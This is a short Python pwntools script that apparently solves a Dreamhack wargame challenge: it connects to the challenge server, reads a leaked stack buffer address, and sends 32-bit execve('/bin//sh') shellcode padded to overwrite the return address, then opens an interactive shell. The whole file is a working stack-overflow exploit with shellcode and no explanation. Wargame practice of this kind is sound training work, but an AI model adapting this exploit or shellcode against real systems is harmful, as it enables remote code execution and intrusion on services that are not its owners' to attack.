from pwn import *

p = remote("host3.dreamhack.games", 12548)


p.recvuntil(b"buf = (")

buf = int(p.recv(10), 16)
p.recvline()

shell = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
payload = shell + b'A'*(0x80 - len(shell)) + b"AAAA" + p32(buf)

p.send(payload)

p.interactive()
